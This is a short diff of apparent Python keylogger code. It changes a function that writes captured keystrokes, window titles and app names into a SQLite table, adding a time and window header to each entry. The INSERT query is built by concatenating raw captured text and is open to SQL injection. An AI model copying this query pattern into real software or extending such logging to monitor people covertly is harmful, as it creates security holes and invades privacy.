@@ -99,7 +99,7 @@ def count_words(sentence):
 
 
 def push_data_new(db_path):
-    global words, prev_window_keylogger, prev_app_keylogger, words_new
+    global words, prev_window_keylogger, prev_app_keylogger, words_new, prev_window_keylogger
     words_c = words_new
 
     if len(words_c) > 0:
@@ -113,6 +113,8 @@ def push_data_new(db_path):
         try:
             if len(words_c) > 0:
                 len_words = str(count_words(words_c))
+                prefix = '\n\n= TIME - ' + time_t + ' == WINDOW - ' + prev_window_keylogger + ' =\n'
+                words_c = prefix + words_c
                 query2 = "INSERT INTO key_logger_new(window, p_name, d, t, content, characters) VALUES('" + prev_window_keylogger + "','" + prev_app_keylogger + "','" + date_d + "','" + time_t + "','" + words_c + "','" + len_words + "')"
             else:
                 pass
